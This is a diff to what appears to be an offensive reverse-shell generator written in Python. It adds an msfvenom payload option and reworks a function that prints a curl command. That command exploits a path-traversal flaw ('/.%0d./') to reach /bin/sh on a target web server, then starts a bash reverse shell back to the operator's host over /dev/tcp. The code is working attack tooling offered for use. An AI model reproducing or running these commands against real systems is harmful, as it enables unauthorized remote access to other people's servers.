@@ -24,7 +24,7 @@ except: pass
 
 # List of shells available
 #shells = ["Shit!! Something isn't right :/"]
-__version__ = "1.3.1"
+__version__ = "1.3.2"
 
 # funny random banner
 import random
@@ -110,11 +110,16 @@ def banner():
 	
 	return banner
 
-def return_curl_shell():
+def return_curl_shell(ip, port):
 	target = input("Enter target:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
 	rport = input("Enter target port:~$ "+bcolors.DARKPURPLE);print(bcolors.ENDC)
 	curl = """curl -s -X POST 'http://"""+target+""":"""+rport+"""/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c "/bin/bash -i >& /dev/tcp/"""+ip+"""/"""+port+""" 0>&1"'"""
 	print(bcolors.YELLOW+"[1] "+bcolors.ENDC+curl)
+
+def get_msfvenom(ip, port):
+	from src.msfvenompayloads import msfvenom_shells
+	msfvenom_shells(ip, port)
+	sys.exit()
 
 def return_shells(shell, ip, port):
 	with open("src/shells.txt","r") as list_shells:
@@ -216,6 +221,17 @@ def main():
 				pass
 			else:
 				ip = get_ip_interfaces(ip)
+
+			# Specific for curl (not very common)
+			if args.shell == "curl":
+				return_curl_shell(args.lhost, args.lport)
+				sys.exit()
+			
+			# For msfvenom payloads
+			if args.shell == "msf" or args.shell == "msfvenom":
+				ip = args.lhost
+				port = args.lport
+				get_msfvenom(ip, port)
 
 			if args.lport and args.shell:
 				port = args.lport
